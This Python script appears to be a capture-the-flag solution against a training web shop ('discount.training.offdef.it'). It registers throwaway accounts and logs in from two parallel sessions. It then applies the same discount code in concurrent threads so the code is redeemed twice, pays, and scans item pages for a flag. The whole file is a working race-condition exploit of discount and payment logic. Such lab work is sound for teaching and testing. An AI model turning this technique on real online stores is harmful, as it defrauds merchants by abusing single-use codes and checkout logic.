import requests
import threading
from threading import Thread
import time
import random
import string


URL="http://discount.training.offdef.it/"

def login(session, username, password):
    target = URL + "login"
    r = session.post(target, data={'username': username, 'password': password})
    return r

def register(session, username, password):
    target = URL + "register"
    r = session.post(target, data={'username': username, 'password': password})
    if 'Code' in r.text:
        return (r.text).split('Code: ')[1].split('</div>')[0]

def apply_discount(session, code):
    target = URL + "apply_discount"
    r = session.post(target, data={'discount': code})
    return r

def add_to_cart(session):
    target = URL + "add_to_cart?item_id=21"
    r = session.get(target)
    return r

def pay(session):
    target = URL + "cart/pay"
    r = session.get(target)
    return r

def show_item(session):
    target = URL + "items"
    r = session.get(target)
    return r

def id_generator(size=10, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for i in range(size))



""" s = requests.Session()
u = id_generator()
#print(u)
p = id_generator()
#print(u)
discount_code = register(s, u, p)
print(discount_code)
add_to_cart(s) """


while True:
    s = requests.Session()
    s1 = requests.Session()
    s2 = requests.Session()

    u = id_generator()
    #print(u)
    p = id_generator()
    #print(u)
    discount_code = register(s, u, p)
    login(s1, u, p)
    login(s2, u, p)
    print(discount_code)
    add_to_cart(s)
    t1 = Thread(target=apply_discount, args=(s1, discount_code))
    t2 = Thread(target=apply_discount, args=(s2, discount_code))

    t1.start()
    t2.start()
    time.sleep(0.1)
    r = pay(s1)
    if 'Payment was sucessful!' in r.text:
        print(r.text)
    r = pay(s2)
    if 'Payment was sucessful!' in r.text:
        print(r.text)
    r = show_item(s1)
    if 'flag' in r.text:
        print(r.text)
    r = show_item(s2)
    if 'flag' in r.text:
        print(r.text)


""" r = pay(s)
print(r.text)
show_item(s) """


